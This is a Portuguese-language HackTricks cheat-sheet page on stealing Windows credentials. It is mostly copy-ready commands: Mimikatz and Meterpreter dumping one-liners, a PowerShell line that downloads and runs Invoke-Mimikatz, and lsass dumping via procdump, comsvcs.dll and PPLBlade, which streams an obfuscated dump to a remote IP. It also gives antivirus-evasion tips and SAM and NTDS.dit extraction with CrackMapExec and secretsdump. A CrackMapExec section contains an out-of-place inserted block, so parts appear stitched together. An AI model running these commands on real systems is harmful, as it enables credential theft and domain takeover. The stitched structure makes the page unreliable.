# Roubando Credenciais do Windows

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo no Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo no telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Credenciais Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encontre outras coisas que o Mimikatz pode fazer nesta** [**página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saiba mais sobre algumas possíveis proteções de credenciais aqui.**](credentials-protections.md) **Essas proteções podem impedir que o Mimikatz extraia algumas credenciais.**

## Credenciais com Meterpreter

Use o [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** eu criei para **procurar senhas e hashes** dentro da vítima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Como **Procdump do** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**é uma ferramenta legítima da Microsoft**, não é detectado pelo Defender.\
Você pode usar esta ferramenta para **despejar o processo lsass**, **baixar o dump** e **extrair** as **credenciais localmente** do dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Este processo é feito automaticamente com [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alguns **AV** podem **detectar** como **malicioso** o uso de **procdump.exe para dump lsass.exe**, isso ocorre porque eles estão **detectando** a string **"procdump.exe" e "lsass.exe"**. Portanto, é **mais furtivo** **passar** como um **argumento** o **PID** de lsass.exe para procdump **em vez do** **nome lsass.exe.**

### Dumping lsass com **comsvcs.dll**

Uma DLL chamada **comsvcs.dll** encontrada em `C:\Windows\System32` é responsável por **dumping process memory** no caso de um crash. Esta DLL inclui uma **função** chamada **`MiniDumpW`**, projetada para ser invocada usando `rundll32.exe`.\
É irrelevante usar os dois primeiros argumentos, mas o terceiro é dividido em três componentes. O ID do processo a ser dumpado constitui o primeiro componente, a localização do arquivo de dump representa o segundo, e o terceiro componente é estritamente a palavra **full**. Não existem opções alternativas.\
Ao analisar esses três componentes, a DLL é engajada na criação do arquivo de dump e na transferência da memória do processo especificado para este arquivo.\
A utilização da **comsvcs.dll** é viável para dump do processo lsass, eliminando assim a necessidade de fazer upload e executar procdump. Este método é descrito em detalhes em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

O seguinte comando é empregado para execução:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Você pode automatizar este processo com** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Despejando lsass com o Gerenciador de Tarefas**

1. Clique com o botão direito na Barra de Tarefas e clique em Gerenciador de Tarefas
2. Clique em Mais detalhes
3. Procure pelo processo "Local Security Authority Process" na aba Processos
4. Clique com o botão direito no processo "Local Security Authority Process" e clique em "Criar arquivo de despejo".

### Despejando lsass com procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) é um binário assinado pela Microsoft que faz parte do pacote [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass com PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma Ferramenta de Dump de Processo Protegido que suporta ofuscar o dump de memória e transferi-lo para estações de trabalho remotas sem gravá-lo no disco.

**Funcionalidades principais**:

1. Contornar a proteção PPL
2. Ofuscar arquivos de dump de memória para evitar mecanismos de detecção baseados em assinatura do Defender
3. Carregar dump de memória com métodos de upload RAW e SMB sem gravá-lo no disco (dump sem arquivo)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets

Para fazer dump das LSA secrets, você pode usar o `secretsdump.py` do Impacket.

```bash
secretsdump.py <domain>/<username>@<dc_ip>
```

### Dump SAM

Para fazer dump do SAM, você pode usar o `secretsdump.py` do Impacket.

```bash
secretsdump.py -sam <system> <security> <sam>
```

### Mimikatz

Mimikatz é uma ferramenta popular para roubar credenciais do Windows. Você pode usá-la para extrair senhas em texto claro, hashes de senha, PINs e tickets Kerberos da memória.

#### Dumping senhas em texto claro

Para fazer dump de senhas em texto claro, execute os seguintes comandos no Mimikatz:

```mimikatz
privilege::debug
sekurlsa::logonpasswords
```

#### Dumping de hashes de senha

Para fazer dump de hashes de senha, execute os seguintes comandos no Mimikatz:

```mimikatz
privilege::debug
lsadump::lsa /patch
```

### Credenciais de rede

Para roubar credenciais de rede, você pode usar o `netcreds`.

```bash
netcreds -i <interface>
```

### Resumo

Roubar credenciais é uma parte crítica do pentesting. Ferramentas como `secretsdump.py`, Mimikatz e `netcreds` são essenciais para extrair credenciais de sistemas Windows.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Extrair o NTDS.dit do DC alvo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extrair o histórico de senhas NTDS.dit do DC alvo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar o atributo pwdLastSet para cada conta NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Roubando SAM & SYSTEM

Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode simplesmente copiá-los de maneira regular** porque eles são protegidos.

### Do Registro

A maneira mais fácil de roubar esses arquivos é obter uma cópia do registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Baixe** esses arquivos para sua máquina Kali e **extraia os hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Você pode realizar a cópia de arquivos protegidos usando este serviço. Você precisa ser Administrador.

#### Usando vssadmin

O binário vssadmin está disponível apenas nas versões do Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mas você pode fazer o mesmo a partir do **Powershell**. Este é um exemplo de **como copiar o arquivo SAM** (o disco rígido usado é "C:" e ele é salvo em C:\users\Public), mas você pode usar isso para copiar qualquer arquivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Finalmente, você também pode usar o [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para fazer uma cópia de SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciais do Active Directory - NTDS.dit**

O arquivo **NTDS.dit** é conhecido como o coração do **Active Directory**, contendo dados cruciais sobre objetos de usuário, grupos e suas associações. É onde os **hashes de senha** dos usuários do domínio são armazenados. Este arquivo é um banco de dados **Extensible Storage Engine (ESE)** e reside em **_%SystemRoom%/NTDS/ntds.dit_**.

Dentro deste banco de dados, três tabelas principais são mantidas:

- **Data Table**: Esta tabela é responsável por armazenar detalhes sobre objetos como usuários e grupos.
- **Link Table**: Mantém o controle de relacionamentos, como associações de grupos.
- **SD Table**: **Descritores de segurança** para cada objeto são mantidos aqui, garantindo a segurança e o controle de acesso para os objetos armazenados.

Mais informações sobre isso: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

O Windows usa _Ntdsa.dll_ para interagir com esse arquivo e é usado pelo _lsass.exe_. Então, **parte** do arquivo **NTDS.dit** pode estar localizada **dentro da memória do `lsass`** (você pode encontrar os dados acessados mais recentemente provavelmente devido à melhoria de desempenho usando um **cache**).

#### Decriptando os hashes dentro do NTDS.dit

O hash é cifrado 3 vezes:

1. Decriptar a Chave de Criptografia de Senha (**PEK**) usando o **BOOTKEY** e **RC4**.
2. Decriptar o **hash** usando **PEK** e **RC4**.
3. Decriptar o **hash** usando **DES**.

**PEK** tem o **mesmo valor** em **todos os controladores de domínio**, mas é **cifrado** dentro do arquivo **NTDS.dit** usando o **BOOTKEY** do **arquivo SYSTEM do controlador de domínio (é diferente entre controladores de domínio)**. É por isso que para obter as credenciais do arquivo NTDS.dit **você precisa dos arquivos NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiando NTDS.dit usando Ntdsutil

Disponível desde o Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Você também pode usar o truque da [**cópia de sombra de volume**](./#stealing-sam-and-system) para copiar o arquivo **ntds.dit**. Lembre-se de que você também precisará de uma cópia do **arquivo SYSTEM** (novamente, [**extraia-o do registro ou use o truque da cópia de sombra de volume**](./#stealing-sam-and-system)).

### **Extraindo hashes de NTDS.dit**

Uma vez que você tenha **obtido** os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como _secretsdump.py_ para **extrair os hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Você também pode **extraí-los automaticamente** usando um usuário administrador de domínio válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **grandes arquivos NTDS.dit** é recomendado extraí-los usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, você também pode usar o **módulo metasploit**: _post/windows/gather/credentials/domain\_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraindo objetos de domínio do NTDS.dit para um banco de dados SQLite**

Objetos NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não apenas segredos são extraídos, mas também os objetos inteiros e seus atributos para uma extração de informações mais detalhada quando o arquivo NTDS.dit bruto já foi recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
O hive `SYSTEM` é opcional, mas permite a descriptografia de segredos (hashes NT & LM, credenciais suplementares como senhas em texto claro, chaves kerberos ou de confiança, históricos de senhas NT & LM). Juntamente com outras informações, os seguintes dados são extraídos: contas de usuário e máquina com seus hashes, flags UAC, timestamp do último logon e mudança de senha, descrição das contas, nomes, UPN, SPN, grupos e membros recursivos, árvore de unidades organizacionais e membros, domínios confiáveis com tipo de confiança, direção e atributos...

## Lazagne

Baixe o binário [aqui](https://github.com/AlessandroZ/LaZagne/releases). Você pode usar este binário para extrair credenciais de vários softwares.
```
lazagne.exe all
```
## Outras ferramentas para extrair credenciais do SAM e LSASS

### Windows credentials Editor (WCE)

Esta ferramenta pode ser usada para extrair credenciais da memória. Baixe-a em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrair credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrair credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Baixe-o de: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) e apenas **execute-o** e as senhas serão extraídas.

## Defesas

[**Aprenda sobre algumas proteções de credenciais aqui.**](credentials-protections.md)

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo no Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo no telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
